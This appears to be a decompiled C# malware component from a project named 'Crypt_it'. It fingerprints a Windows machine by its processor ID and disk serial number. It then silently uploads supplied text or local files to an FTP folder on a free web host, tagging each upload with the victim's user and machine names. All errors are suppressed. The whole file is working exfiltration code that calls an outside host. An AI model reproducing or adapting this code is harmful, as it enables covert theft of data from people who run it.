using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace Crypt_it;

internal sealed class Ftp
{
	public static string UniqID()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void UploadFile(string FTPAddress = "ftp://files.000webhost.com/public_html/", string ftpUsername = "FTP UserName", string ftpPassword = "FTP Password", string InfData = "")
	{
		try
		{
			string text = UniqID();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTPAddress + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(InfData);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void UploadData(string FTPAddress = "ftp://files.000webhost.com/public_html/", string ftpUsername = "FTP UserName", string ftpPassword = "ACCESS", string localFilePath = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			webClient.UploadFile(FTPAddress + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(localFilePath)), "STOR", localFilePath);
		}
		catch
		{
		}
	}
}
